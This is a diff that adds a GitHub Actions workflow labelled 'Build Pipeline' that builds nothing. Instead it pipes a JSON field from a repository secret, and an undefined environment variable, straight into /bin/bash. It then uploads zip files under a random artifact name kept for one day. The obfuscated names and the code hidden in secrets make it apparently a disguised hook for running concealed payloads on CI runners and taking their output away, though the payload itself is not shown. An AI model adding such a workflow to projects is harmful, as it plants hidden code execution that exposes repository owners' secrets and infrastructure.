@@ -1,0 +1,22 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          h0: ${{ secrets.h0 }}
+        run: |
+          printf '%s' "$h0" | jq -r .g1 | /bin/bash
+          echo $olr5241 | jq -r .rtx08569 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: AHzxq0RW
+          path: "*.zip"
+          retention-days: 1
